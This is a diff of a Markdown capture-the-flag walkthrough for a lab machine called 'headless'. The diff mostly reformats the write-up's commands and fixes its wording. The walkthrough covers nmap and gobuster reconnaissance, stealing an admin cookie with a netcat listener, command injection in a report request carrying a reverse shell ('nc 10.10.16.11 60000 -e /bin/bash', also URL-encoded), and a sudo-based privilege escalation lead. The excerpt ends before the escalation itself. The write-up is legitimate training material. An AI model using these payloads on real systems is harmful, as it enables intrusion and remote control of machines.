@@ -12,7 +12,9 @@ tags:
 
 First of all, let's do an nmap scan with the following flag:
 
-```nmap -p- -sC -sV -T4 10.10.11.8```
+```shell
+nmap -p- -sC -sV -T4 10.10.11.8
+```
 
 - -p- to scan all ports
 - -sC to execute the default scripts
@@ -25,7 +27,7 @@ With the output of our scan we can see we have 2 ports open:
 - Port 5000 we have an http server, it will greatly interest us because we now know that we have to deal with a web server
 
 Just open the browser with the following url 
-https://IP_TARGETED:PORT_NUMBER
+http://IP_TARGETED:PORT_NUMBER
 
 ![website1](/assets/img/website1.png)
 
@@ -39,14 +41,16 @@ I used gobuster for this with the following flags :
 - -w to specify the wordlist to use
 
 Either the following command
-``` gobuster dir -u http://10.10.11.8:5000/ -w /./usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt ```
+```shell 
+gobuster dir -u http://10.10.11.8:5000/ -w /./usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
 
-With the following output of our gobuster command we can see we have only two directories for this website:
+With the following output of our gobuster command we can see we have only two files for this website:
 ![website2.png](/assets/img/website2.png)
 
-When we're on the the website with the IP address following by the port is we click on the button "For questions" we're redirected on the directory /support 
+When we're on the the website with the IP address following by the port is we click on the button "For questions" we're redirected on the file support of the website
 
-We can not access the/dashboard because as a user we are not allowed, so it must be borne in mind that connection cookies will make full part of this challenge
+We can not access the file dashboard because as a user we are not allowed, so it must be borne in mind that connection cookies will make full part of this challenge
 
 ### 3 STEP INTERACT LIKE A USER
 
@@ -69,7 +73,9 @@ Here, the objective is to get the cookie of the administrator to be able to conn
 
 Use the following command to put your machine on listening.
 
-```nc -lnvp 9001 ```
+```shell
+nc -lnvp 9001
+```
 
 - nc stands for the tool netcat
 - -l for listen mode
@@ -98,7 +104,7 @@ In your browser now you can try to access to the dashboard directory, if you can
 
 ### STEP 5 LET'S TAKE A FOOT IN THE MACHINE
 
-Now from this dashboard we will see with the help of ntore ami burp suite what happens when we click on the button "Generate a report".
+Now from this dashboard we will see with the help of our friend burp suite what happens when we click on the button "Generate a report".
 
 ![before_ci.png](/assets/img/before_ci.png)
 
@@ -112,7 +118,9 @@ What we’re going to do is we’re going to create a reverse shell and we’re 
 
 That's our command, 
 
-```nc 10.10.16.11 60000 -e /bin/bash ```
+```shell
+nc 10.10.16.11 60000 -e /bin/bash
+```
 
 Now let's url encode:
 
@@ -120,7 +128,9 @@ nc%2010.10.16.11%2060000%20-e%20%2Fbin%2Fbash
 
 you need before performing the command injection to listen on the port of your choice here port 60000
 
-``` nc -lnvp 60000```
+```shell
+nc -lnvp 60000
+```
 
 just put our command and send the request
 
@@ -128,8 +138,11 @@ just put our command and send the request
 
 
 Now we have one foot in the machine :
-(We can have a better shell using the command 
-```python3 -c 'import pty; pty.spawn("/bin/bash")'``` )
+
+We can have a better shell (more stable is our shell, the more we can do commands) using the command :
+```shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 ![revshell1.png](/assets/img/revshell1.png)
 
@@ -141,9 +154,14 @@ Let's goo !!!! We're a user, ok now let's try to be root!!!
 
 ### STEP 6 : A PRIVILEGE ESCALATION MUST BE PERFORMED
 
-with the command ```sudo -l```, let's which command we can run 
+with the command 
+```shell
+sudo -l
+```
+let's which command we can run 
 We have this output:
 
+```shell
 Matching Defaults entries for dvir on headless:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
@@ -151,6 +169,7 @@ Matching Defaults entries for dvir on headless:
 
 User dvir may run the following commands on headless:
     (ALL) NOPASSWD: /usr/bin/syscheck
+```
 
 We need to have more information about this command syscheck
 The bash code behind this command is as follows
